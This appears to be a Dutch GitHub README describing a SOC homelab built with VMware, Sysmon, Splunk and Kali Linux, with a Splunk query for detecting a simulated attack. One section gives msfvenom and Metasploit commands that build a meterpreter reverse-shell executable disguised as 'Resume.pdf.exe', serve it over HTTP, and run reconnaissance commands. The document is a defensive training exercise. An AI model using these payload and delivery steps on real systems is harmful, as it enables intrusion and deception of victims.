## Cybersecurity SOC Homelab

Een praktische en veilige Security Operations Center (SOC) oefenomgeving gebouwd met VMware, Windows (Sysmon + Splunk) en Kali Linux.
Deze homelab is ontworpen om te leren hoe je loganalyse, detectie en incidentanalyse uitvoert — zonder risico voor je eigen netwerk of hostmachine.

🎯 Doelstelling

Het doel van dit project is het opzetten van een gecontroleerde omgeving waarin je leert:

Logbestanden verzamelen en analyseren in Splunk.

Telemetrie genereren via netwerkactiviteit, processen en aanvallen.

Sysmon- en Splunk-events interpreteren voor detectie en incidentrespons.

## Ontwikkelde Vaardigheden

Inzicht in SIEM-principes (logverzameling, indexering, correlatie).

Virtuele netwerken ontwerpen en snapshots beheren in VMware.

Werken met Sysmon en Windows Event Logging.

Detectieregels schrijven en SPL-query’s gebruiken in Splunk.

## Gebruikte Tools
Tool	Functie
VMware Workstation Pro / Player	Virtualisatieplatform
Windows 10/11 VM	Endpoint met Sysmon en Splunk
Kali Linux VM	Aanvaller/testmachine
Splunk Enterprise / Free	Logverzameling en -analyse
Sysmon + Splunk Add-on	Verrijkte proces- en netwerkloggegevens
## Lab Architectuur
[Host PC]
 └── VMware Workstation
      ├── VM1: Windows (Sysmon + Splunk)
      └── VM2: Kali Linux (nmap, reverse shell test)


Netwerkopties:

NAT / Bridged → toegang tot internet (optioneel)

LAN Segment → volledig geïsoleerd, aanbevolen voor security-tests

<img width="729" height="567" alt="lab-topology" src="https://github.com/user-attachments/assets/9f145dd1-5c41-4abb-98d1-483fc3cd3e3a" />


## Installatiestappen

1️⃣ VMware installeren

Download VMware Workstation Pro / Player.

Installeer met standaardinstellingen.

Controleer dat virtualisatie (VT-x/AMD-V) is ingeschakeld in de BIOS.

2️⃣ Windows VM aanmaken

Naam: WIN-SOC

2–4 vCPU’s, 4–8 GB RAM, 50 GB opslag.

Koppel Windows ISO → installeer Windows.

Installeer VMware Tools na installatie.

3️⃣ Kali Linux VM importeren

Download officiële Kali VMware image (.7z).

Pak uit en open .vmx in VMware.

Standaard inlog: kali / kali.

4️⃣ Netwerk instellen

Gebruik een Host-Only of LAN Segment netwerk:

VM	IP	Subnet
Windows	192.168.20.10	/24
Kali	192.168.20.11	/24

Verbinding testen:

ping 192.168.20.10


(Let op: Windows Firewall moet ICMP toestaan.)

5️⃣ Snapshot maken

Maak een baseline snapshot van beide VM’s:
VMware → Snapshot → Take Snapshot → Baseline

6️⃣ Splunk & Sysmon installeren (Windows)

Installeer Splunk Enterprise en open http://127.0.0.1:8000.

Maak een nieuwe index aan: endpoint.

Installeer Sysmon (bijv. met SwiftOnSecurity-config).

Voeg toe aan inputs.conf:

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = endpoint
renderXml = true
disabled = 0


Herstart Splunk-service en controleer of Sysmon-events zichtbaar zijn.

## 7️⃣ Kali Demo — Reverse Shell Simulatie

In deze demo genereer je telemetrie door een gecontroleerde reverse shell-aanval op het Windows-systeem uit te voeren.
De logs hiervan worden later in Splunk geanalyseerd.

🔹 Stap 1 — Payload-opties bekijken
msfvenom -l payloads


Toont een lijst met beschikbare payloads in Metasploit.
Handig om te zien welke type shell of exploit je kunt genereren.

🔹 Stap 2 — Payload aanmaken
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<kali_ip> lport=4444 -f exe -o Resume.pdf.exe


Genereert een Windows-executable die een reverse shell terugstuurt naar de Kali IP op poort 4444.
De payload wordt opgeslagen als Resume.pdf.exe.

🔹 Stap 3 — Metasploit starten
msfconsole


Start het Metasploit Framework om de reverse shell-verbinding te kunnen ontvangen.

🔹 Stap 4 — Handler instellen
use exploit/multi/handler


Activeert een generieke listener die inkomende shells opvangt.

🔹 Stap 5 — Opties bekijken
options


Laat alle configureerbare parameters zien van de exploit-handler.

🔹 Stap 6 — Payload en IP configureren
set payload windows/x64/meterpreter/reverse_tcp
set lhost <kali_ip>


Bepaalt welk payloadtype en IP-adres gebruikt wordt voor de connectie.

🔹 Stap 7 — Exploit uitvoeren
exploit


Start de listener.
Zodra het doelbestand op Windows wordt uitgevoerd, opent de shell terug naar Kali.

🔹 Stap 8 — HTTP-server starten
python3 -m http.server 9999


Start een eenvoudige webserver op poort 9999 om het Resume.pdf.exe bestand te hosten.
Windows kan dit bestand via de browser downloaden.

🔹 Stap 9 — Payload uitvoeren (Windows)

Open op Windows de browser.

Navigeer naar http://<kali_ip>:9999/Resume.pdf.exe.

Download en voer het bestand uit.

Na uitvoering verschijnt op Kali:

[*] Meterpreter session 1 opened

🔹 Stap 10 — Basiscommando’s uitvoeren

In de Meterpreter-shell:

shell
net user
net group


Deze acties genereren logactiviteit (proces- en netwerkverbindingen).
Splunk registreert deze als Sysmon Event ID 1 (Process Create) en Event ID 3 (Network Connect).

## Analyse in Splunk

Gebruik bijvoorbeeld:

index=endpoint Image="*Resume.pdf.exe*" OR CommandLine="*net user*"


Hiermee vind je de processen die door de aanval zijn gestart.

Hier zie je dat de pdf.exe gebruikt was om Reverse shell uit te voeren

<img width="2552" height="1248" alt="splunk-result" src="https://github.com/user-attachments/assets/e7928269-c299-470d-8664-08ebab1e72ae" />


##Belangrijkste Leerpunten

✅ Sysmon biedt onmisbare context (Process Create, Network Connect, Registry Changes).

✅ Splunk maakt snelle correlatie van gedrag en events mogelijk.

✅ Geïsoleerd netwerk voorkomt impact op je eigen host.

✅ Iteratief testen met eenvoudige scripts versnelt je leerproces.
